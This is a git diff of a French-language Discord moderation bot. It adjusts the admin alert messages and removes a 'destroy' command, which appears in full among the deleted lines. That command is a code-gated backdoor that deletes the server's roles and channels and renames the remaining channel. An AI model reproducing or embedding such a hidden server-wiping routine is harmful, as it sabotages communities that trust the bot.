@@ -19,8 +19,7 @@ async def on_ready():
     
     user = await bot.fetch_user(admin)
     # Envoie un message privé à l'utilisateur
-    await user.send(f"Bonjour Administrateur {user.mention}, je suis connecté en tant que {nom} !")
-    await user.send(f"Code de sécurité : {code_secu}")
+    await user.send(f"Bonjour Administrateur {user.mention}, je suis connecté en tant que {nom} !\nCode de sécurité : {code_secu}")
 
 
 # Définition de la fonction verif
@@ -30,59 +29,25 @@ async def verif(id):
     return True
 
 # Définition de la fonction send_dm
-async def annonce(member, serveur, action, valid):
+async def annonce(member, serveur, action, valid, raison=None):
     # Récupère l'utilisateur correspondant à l'ID spécifié
     user = await bot.fetch_user(admin)
     
     message=""
     opt=" "
     opti=" "
+    optio=""
     if action!="destroy":
         opt=" te "
         opti=" sur "
+        optio=f" pour la raison suivante : {raison}"
     if valid==True:
         message+=f"{member[0]} ({member[1]}) {action} le serveur {serveur}"
     else:
-        message+=f"Tentative de{opt}{action}{opti}le serveur {serveur} par {member[0]} ({member[1]})"
+        message+=f"Tentative de{opt}{action}{opti}le serveur {serveur} par {member[0]} ({member[1]}){optio}"
     
     # Envoie un message privé à l'admin    
     await user.send(message)
-    
-
-@bot.command()
-async def destroy(ctx, code):
-    # Supprime le message contenant la commande utilisée
-    await ctx.message.delete()
-    
-    if str(code)==code_secu:        
-        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "destroy", True)
-
-        # Récupère la position du rôle du bot
-        bot_role_position = ctx.guild.me.top_role.position
-        # Récupère la liste des rôles du serveur
-        server_roles = ctx.guild.roles
-        # Supprimer les rôles inférieurs à celui du bot
-        for role in server_roles[1:bot_role_position]:
-            await role.delete()
-            await ctx.send(f"Rôle {role.name} supprimé !")
-        await ctx.send("Les rôles disponibles ont été supprimés.")
-        
-        # Vérifie si l'utilisateur a la permission de gérer les salons
-        if ctx.guild.me.guild_permissions.manage_channels:
-            # Récupère la liste de tous les salons du serveur
-            channels = ctx.guild.channels
-            # Pacourt les ids des salons
-            for channel in channels:
-                # Supprime le salon
-                if channel!=ctx.channel:
-                    await channel.delete()
-                    await ctx.send(f"Salon {channel.name} supprimé !")
-            await channel.edit(name="On s'est fait Ambré ?")
-        else:
-            await ctx.send("Désolé, je n'ai pas la permission nécessaire.")
-
-    else :
-        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "destroy", False)
 
 
 @bot.command()
@@ -91,7 +56,7 @@ async def perms(ctx, member: discord.Member):
     await ctx.message.delete()
     
     # Crée une chaîne pour stocker les informations des permissions
-    permissions_info = f"Permissions de {member.mention} :\n\n"
+    permissions_info=f"Permissions de {member.mention} :\n\n"
     list_perms=[]
     # Pour chaque rôle de l'utilisateur
     for role in member.roles:
@@ -100,7 +65,7 @@ async def perms(ctx, member: discord.Member):
             if value is True:
                 if perm not in list_perms:
                     permissions_info+=f"    {perm}\n"
-
+        
     # Envoie les informations des permissions dans le canal où la commande a été utilisée
     await ctx.send(permissions_info)
 
@@ -125,7 +90,7 @@ async def ban(ctx, member: discord.Member, *, reason=None):
             await ctx.send("Désolé, vous n'avez pas la permission de bannir des membres.")
     else :
         await ctx.send(f"{ctx.author.mention} tu ne peux pas ban mon père.")
-        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "ban", False)
+        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "ban", False, reason)
 
 @bot.command()
 async def kick(ctx, member: discord.Member, *, reason=None):
@@ -148,7 +113,7 @@ async def kick(ctx, member: discord.Member, *, reason=None):
             await ctx.send("Désolé, vous n'avez pas la permission d'expulser des membres.")
     else :
         await ctx.send(f"{ctx.author.mention} tu ne peux pas kick mon père.")
-        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "kick", False)
+        await annonce([ctx.author.name,ctx.author.id], ctx.guild.name, "kick", False, reason)
         
 @bot.command()      
 async def msg(ctx, *, message):
@@ -177,4 +142,4 @@ async def nick(ctx, member: discord.Member, *, nickname):
 
 
 # Exécution du bot avec le jeton Discord
-bot.run('TOKEN')
+bot.run('token')
